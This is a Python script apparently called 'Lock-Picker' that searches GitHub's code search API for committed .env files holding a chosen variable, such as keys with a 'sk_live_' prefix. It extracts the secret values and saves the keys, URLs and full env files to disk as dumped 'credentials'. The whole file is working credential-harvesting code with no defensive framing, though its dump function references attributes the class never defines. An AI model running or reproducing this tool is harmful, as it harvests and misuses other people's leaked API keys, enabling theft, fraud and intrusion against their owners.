banner = """
 _       ___     __  __  _         ____ ____   __  __  _    ___  ____  
| |     /   \   /  ]|  |/ ]       |    \    | /  ]|  |/ ]  /  _]|    \ 
| |    |     | /  / |  ' /  _____ |  o  )  | /  / |  ' /  /  [_ |  D  )
| |___ |  O  |/  /  |    \ |     ||   _/|  |/  /  |    \ |    _]|    / 
|     ||     /   \_ |     ||_____||  |  |  /   \_ |     ||   [_ |    \ 
|     ||     \     ||  .  |       |  |  |  \     ||  .  ||     ||  .  \\
|_____| \___/ \____||__|\_|       |__| |____\____||__|\_||_____||__|\_|
                                               by zen
"""

try:
    from requests import Session
    from requests.exceptions import ChunkedEncodingError
    from time import sleep
    from base64 import b64decode
    from urllib3.exceptions import ReadTimeoutError
    from argparse import ArgumentParser
    from dotenv import load_dotenv
    from os import getenv, mkdir, getcwd
    from os.path import join, exists
    from time import sleep
    from hashlib import sha256
except KeyboardInterrupt:
    print(banner)
    print("[*] Exiting...")


# main cli function
def main():

    # print the banner
    print(banner)

    # parse the cli parameters
    parser = ArgumentParser(description=".env Enumerator")
    parser.add_argument('env_variable', type=str, help="Environment variable to lookup")
    parser.add_argument('-d', '--delay', type=int, help="Select a delay in-between requests (default: 100ms)")
    parser.add_argument('-m', '--min-size', type=int, help="The minimum size of an api key (default: 16)")
    parser.add_argument('-s', '--size', type=int, help="The fixed size of an api key")
    parser.add_argument('-o', '--output', type=str, help="Save the api keys in a text file")
    parser.add_argument('-u', '--urls', type=str, help="Save the urls in a text file")
    parser.add_argument('-p', '--prefix', type=str, help="Select an api key prefix (ex: sk_live_)")
    parser.add_argument('-q', '--quiet', action='store_true', help="Disable verbosity")
    parser.add_argument('--dump', type=str, help="Dump the env files to a specific folder.")
    args = parser.parse_args()

    # load the github api key
    load_dotenv(join(getcwd(), '.env'))
    load_dotenv()
    github_api_key = getenv('GITHUB_API_KEY')
    print("[*] Github api key loaded!")

    # search the urls and api keys from github
    delay = 0.1 if args.delay is None else int(args.delay) / 1000
    lockpicker = LockPicker(github_api_key=github_api_key, quiet=args.quiet, delay=delay)
    urls_list, api_keys = lockpicker.search_urls_from_env_variable(args.env_variable, min_size=args.min_size, size=args.size, prefix=args.prefix)

    # save the api keys if needed
    if args.output is not None:
        print(f"[*] Saving api keys to '{args.output}'...", end='', flush=True)
        with open(args.output, 'w', encoding='utf-8') as text_file:
            for api_key in api_keys:
                text_file.write(api_key + '\n')
        print("done.")

    # print the api keys if not saved
    else:
        print('\n')
        for api_key in api_keys:
            print(api_key)

    # save the urls if needed
    if args.urls is not None:
        print(f"[*] Saving urls to '{args.urls}'...", end='', flush=True)
        with open(args.urls, 'w', encoding='utf-8') as text_file:
            for url in urls_list:
                text_file.write(url + '\n')
        print("done.")
    
    # dump the env files if needed
    if args.dump is not None:
        lockpicker.dump_urls(urls_list, args.dump)

    # end of process
    exit(0)


# github api
class Github:

    # create a github api object
    def __init__(self, api_key):
        self.session = Session()
        self.api_key = api_key

    # search on github api
    def search(self, query, page=1, filename=None):
        print(f"[*] Getting results from '{query}' at page {page}.")

        # build the query
        headers = {
            "Authorization": f"token {self.api_key}",
            "Accept": "application/vnd.github+json"
        }
        if filename is not None:
            query = f'filename:{filename} {query}'
        params = {
            'q': query,
            'page': page,
            'per_page': 100
        }
        url = f"https://api.github.com/search/code"

        # send the query
        try:
            response = self.session.get(url, headers=headers, params=params)
        except ChunkedEncodingError:
            response = None
        return response
    
    # get a reference from the github api
    def get_reference(self, url):
        print(f"[*] Getting reference from '{url}'.")
        headers = { "Authorization": f"Bearer {self.api_key}" }
        try:
            return self.session.get(url, headers=headers)
        except ReadTimeoutError:
            pass
        return None


# lockpicker tool
class LockPicker:

    # create a lockpicker api object
    def __init__(self, github_api_key, quiet=False, delay=0.1):
        self.github = Github(github_api_key)
        self.quiet = quiet
        self.delay = delay

    # search urls from env file
    def search_urls_from_env_variable(self, env_variable, min_size=None, size=None, prefix=None):
        references = self.search_env_variable_from_env_file(env_variable, prefix=prefix)
        urls_list, api_keys = self.parse_references(references, env_variable, min_size=min_size, size=size)
        if self.quiet != True:
            print(f"[*] {len(api_keys)} api keys were found from {len(urls_list)} urls.")
        return urls_list, api_keys

    # search an env variable from an .env file
    def search_env_variable_from_env_file(self, env_variable, prefix=None):

        # build a list of queries
        if self.quiet != True:
            print("[*] Searching references on Github...")
        alnum = "abcdefghijklmnopqrstuvwxyz0123456789"
        if prefix is None:
            prefix = ''
        subqueries = [
            f'"{env_variable}={prefix}',        # ENV_VARIABLE=a
            f'"{env_variable} = {prefix}',      # ENV_VARIABLE = a
            f'"{env_variable}=\'{prefix}',      # ENV_VARIABLE='a
            f'"{env_variable} = \'{prefix}',    # ENV_VARIABLE = 'a
            f'{env_variable}="{prefix}',        # ENV_VARIABLE="a
            f'{env_variable} = "{prefix}',      # ENV_VARIABLE = "a
        ]

        # browse each query
        references = []
        query_count = 0
        query_max = len(subqueries) * len(alnum)
        github_error = False
        total_references_count = 0
        try:
            for subquery in subqueries:
                for x in alnum:
                    query_count += 1
                    query = subquery + x
                    if subquery[0] == '"':
                        query += '"'

                    # send the query
                    query_references = self.search_query(query, filename='.env')
                    if query_references is None:
                        github_error = True
                        break

                    # parse the response
                    query_references_count = 0
                    for reference in query_references:
                        if reference not in references:
                            references.append(reference)
                            query_references_count += 1
                    total_references_count += query_references_count
                    if self.quiet != True:
                        print(f"    - [{query_count}/{query_max}] {query_references_count} references found (total: {total_references_count}).")

                    # get the next pages
                    page = 1
                    while query_references_count == 100 and page <= 10:
                        page += 1

                        # send the query
                        query_references = self.search_query(query, page=page, filename='.env')
                        if query_references is None:
                            github_error = True
                            break

                        # parse the response
                        query_references_count = 0
                        for reference in query_references:
                            if reference not in references:
                                references.append(reference)
                                query_references_count += 1
                        total_references_count += query_references_count
                        if self.quiet != True:
                            print(f"    - [{query_count}/{query_max}] {query_references_count} new references found (total: {total_references_count}).")


                # check for errors
                if github_error == True:
                    break
        
        # return the references found
        except KeyboardInterrupt:
            pass
        return references

    # search an env variable with a subkey
    def search_query(self, query, page=1, filename=None):

        # search on github
        response = self.github.search(query, page=page, filename=filename)
        if response is None:
            return []

        # respect the delay
        if self.delay is not None:
            sleep(self.delay)

        # check for rate limit
        if response.status_code == 403:
            if response.text.find('API rate limit exceeded') != -1:
                if self.quiet != True:
                    print(f"[*] Blocked by the rate limit. Sleeping 60 seconds...")
                sleep(60)
                return self.search_query(query, page=page, filename=filename)
        
        # check for query parsing error
        if response.status_code == 422:
            if response.text.find('ERROR_TYPE_QUERY_PARSING_FATAL unable to parse query!') != -1:
                return []

        # check for errors
        if response.status_code != 200:
            if self.quiet != True:
                print(f"Error: {response.status_code} - {response.text}")
            return None

        # parse the references
        response = response.json()
        references = []
        for item in response['items']:
            url = item['url']
            if url not in references:
                references.append(url)
        
        # get the others pages if needed
        if response['total_count'] > 100 * page:
            if page < 10:
                references += self.search_query(query, page=page + 1, filename=filename)

        # return the references
        return references

    # parse all the references list
    def parse_references(self, references, env_variable, min_size=None, size=None):

        # browse each references
        if self.quiet != True:
            print(f"[*] Scanning {len(references)} references...")
        urls_list = []
        all_api_keys = []
        try:
            for url in references:

                # parse the reference
                results = self.parse_reference(url, env_variable, min_size=min_size, size=size)
                if results is None:
                    continue
                url, api_keys = results

                # add the url to the list
                if url not in urls_list:
                    urls_list.append(url)

                # add the api keys to the list
                for api_key in api_keys:
                    if api_key not in all_api_keys:
                        all_api_keys.append(api_key)

        # check if the user stopped the scan
        except KeyboardInterrupt:
            pass

        # return the list of urls and api keys
        return (urls_list, all_api_keys)
    
    # parse a single reference
    def parse_reference(self, url, env_variable, min_size=None, size=None):

        # get the reference from the api
        response = self.github.get_reference(url)

        # check for rate limits
        if response.status_code == 403 and response.text.find("API rate limit exceeded for user ID") != -1:
            if self.quiet != True:
                print(f"[*] Blocked by the rate limit. Sleeping 60 seconds...")
            sleep(60)
            return self.parse_reference(url, env_variable, min_size=min_size, size=size)

        # check for errors
        elif response.status_code != 200:
            if self.quiet != True:
                print(f"Error: {response.status_code} - {response.text}")
            return None

        # parse the response
        response = response.json()
        download_url = response['download_url']
        content = b64decode(''.join(response['content'].split('\n'))).decode("utf-8").split('\n')
                
        # check the file content
        lines = []
        for line in content:
            if line.find(env_variable) == -1:
                continue
            lines.append(line.strip())

        # print each api keys found
        if self.quiet != True:
            print(f"[*] URL Found: \033[94m{download_url}\033[0m")
        api_keys = self.get_api_keys_from_lines(env_variable, lines, min_size=min_size, size=size)

        # return the api keys and the urls list
        return (download_url, api_keys)

    # get the api keys from lines
    def get_api_keys_from_lines(self, env_variable, lines, min_size=None, size=None):

        # browse each line
        api_keys = []
        for line in lines:
            
            # simple key-value api key parsing
            pair = line.split('=')
            if len(pair) == 2:
                variable_key = pair[0]
                if variable_key.find(env_variable) != -1:

                    # remove quotes from variable key
                    if len(variable_key) >= 2:
                        if (variable_key[0] == '"' and variable_key[-1] == '"') or (variable_key[0] == "'" and variable_key[-1] == "'"):
                            variable_key = variable_key[1:-1]

                    # remove comment from variable key
                    if variable_key[0] == '#':
                        variable_key = variable_key[1:]
                    variable_key = variable_key.strip()
                    if variable_key == '':
                        continue
                    
                    # remove quote from api key
                    api_key = pair[1]
                    if len(api_key) >= 2:
                        if (api_key[0] == '"' and api_key[-1] == '"') or (api_key[0] == "'" and api_key[-1] == "'"):
                            api_key = api_key[1:-1]
                    api_key = api_key.strip()
                    for c in [' ', '\t']:
                        pos = api_key.find(c)
                        if pos != -1:
                            api_key = api_key[:pos]
                    if api_key == '':
                        continue

                    # check if the size or minimum size mismatch
                    if size is not None:
                        if len(api_key) != size:
                            if self.quiet != True:
                                print(f"      * \033[93m{variable_key}\033[0m: \033[91m{api_key}\033[0m")
                            continue
                    if min_size is not None:
                        if len(api_key) < min_size:
                            if self.quiet != True:
                                print(f"      * \033[93m{variable_key}\033[0m: \033[91m{api_key}\033[0m")
                            continue

                    # save the api key
                    if self.quiet != True:
                        print(f"      * \033[93m{variable_key}\033[0m: \033[92m{api_key}\033[0m")
                    if api_key not in api_keys:
                        api_keys.append(api_key)

            # check environment value with multiple equals
            else:
                pos = line.find('=')
                if pos != -1:
                        
                    # parse the api key
                    variable_key = env_variable
                    api_key = line[pos + 1:]

                    # check if the size or minimum size mismatch
                    if size is not None:
                        if len(api_key) != size:
                            if self.quiet != True:
                                print(f"      * \033[93m{variable_key}\033[0m: \033[91m{api_key}\033[0m")
                            continue
                    if min_size is not None:
                        if len(api_key) < min_size:
                            if self.quiet != True:
                                print(f"      * \033[93m{variable_key}\033[0m: \033[91m{api_key}\033[0m")
                            continue

                    # save the api key
                    if self.quiet != True:
                        print(f"      * \033[93m{variable_key}\033[0m: \033[92m{api_key}\033[0m")
                    if api_key not in api_keys:
                        api_keys.append(api_key)

                # unknown api key
                else:
                    print(f"DEBUG: unknown api key: '{line}'")
        
        # return the list of api keys
        return api_keys

    # dump the filename from an urls list
    def dump_urls(self, urls_list, foldername):

        # create the dump folder
        dump_foldername = foldername
        if self.quiet != True:
            print(f"[*] Dumping creditentials to '{dump_foldername}' folder...")
        try:
            mkdir(dump_foldername)
        except FileExistsError:
            pass

        # browse each urls
        query_count = 0
        query_max = len(urls_list)
        for url in urls_list:
            query_count += 1

            # build the query
            headers = {
                "Authorization": f"Bearer {self.api_key}",
                "Accept": "application/vnd.github+json"
            }

            # send the query
            response = self.session.get(url, headers=headers)

            # respect the delay
            if self.delay is not None:
                sleep(self.delay)

            # print the status
            org_filename = url.split('/')[-1]
            print(f"    - [{query_count}/{query_max}] '{org_filename}' dumped.")

            # check for errors
            if response.status_code != 200:
                if self.quiet != True:
                    print(f"Error: {response.status_code} - {response.text}")
                break
            
            # generate the filename from content hash (to avoid duplicates)
            content_hash = sha256(response.content.decode('utf-8').encode()).hexdigest()
            filename = join(dump_foldername, content_hash + '.txt')

            # save the content in the file
            if exists(filename) == False:
                with open(filename, "w", encoding='utf-8') as txt_file:
                    txt_file.write(response.text)


# run the main function if needed
if __name__ == "__main__":
    main()